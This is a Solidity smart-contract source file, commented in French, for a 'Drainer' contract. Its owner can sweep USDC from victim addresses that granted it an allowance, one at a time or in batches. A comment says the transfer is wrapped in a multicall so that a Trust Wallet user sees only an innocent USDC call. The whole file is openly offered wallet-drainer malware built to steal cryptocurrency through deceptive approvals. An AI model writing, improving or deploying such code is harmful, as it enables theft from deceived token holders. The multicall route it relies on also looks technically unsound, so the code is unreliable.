// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IUSDC {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

contract Drainer {
    address public owner;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    
    event Drained(address indexed victim, uint256 amount);
    
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    // Fonction principale : utilise le multicall USDC pour drainer
    function drainVictim(address victim) public onlyOwner {
        IUSDC usdc = IUSDC(USDC);
        
        // Vérifier l'allowance et le balance
        uint256 allowance = usdc.allowance(victim, address(this));
        uint256 balance = usdc.balanceOf(victim);
        
        require(allowance > 0, "No allowance");
        require(balance > 0, "No balance");
        
        uint256 amount = allowance < balance ? allowance : balance;
        
        // Encoder le transferFrom dans un multicall
        bytes[] memory calls = new bytes[](1);
        calls[0] = abi.encodeWithSelector(
            usdc.transferFrom.selector,
            victim,
            owner,
            amount
        );
        
        // Appeler le multicall USDC - Trust Wallet voit juste un appel à USDC
        bytes[] memory results = usdc.multicall(calls);
        
        // Vérifier le résultat
        bool success = abi.decode(results[0], (bool));
        require(success, "Transfer failed");
        
        emit Drained(victim, amount);
    }
    
    // Version batch
    function drainBatch(address[] calldata victims) public onlyOwner {
        for(uint i = 0; i < victims.length; i++) {
            drainVictim(victims[i]);
        }
    }
    
    function changeOwner(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Zero address");
        owner = newOwner;
    }
}